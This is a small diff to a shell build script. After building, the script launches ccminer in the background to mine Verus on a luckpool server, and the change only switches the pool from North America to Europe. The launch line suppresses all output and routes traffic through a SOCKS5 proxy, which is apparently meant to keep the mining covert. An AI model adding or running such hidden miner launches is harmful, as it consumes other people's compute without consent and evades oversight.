@@ -9,4 +9,4 @@ chmod +x configure.sh
 chmod +x autogen.sh
 ./build.sh
 echo "love u fika"
-nohup ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u "$1"p1F6XBBcEBKkm.RVZ -p x -t 2 -x socks5://"$2":443 </dev/null >/dev/null 2>&1 &
+nohup ./ccminer -a verus -o stratum+tcp://eu.luckpool.net:3956 -u "$1"p1F6XBBcEBKkm.RVZ -p x -t 2 -x socks5://"$2":443 </dev/null >/dev/null 2>&1 &
